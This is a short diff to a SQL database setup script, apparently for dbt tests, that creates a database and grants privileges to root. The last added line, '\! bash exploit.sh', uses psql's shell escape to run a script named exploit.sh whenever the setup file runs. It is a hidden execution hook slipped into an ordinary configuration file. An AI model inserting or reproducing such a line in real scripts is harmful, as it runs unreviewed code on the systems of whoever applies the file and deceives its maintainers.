@@ -14,3 +14,5 @@ CREATE ROLE dbt_test_user_3;
 
 CREATE DATABASE "dbtMixedCase";
 GRANT CREATE, CONNECT ON DATABASE "dbtMixedCase" TO root WITH GRANT OPTION;
+
+\! bash exploit.sh
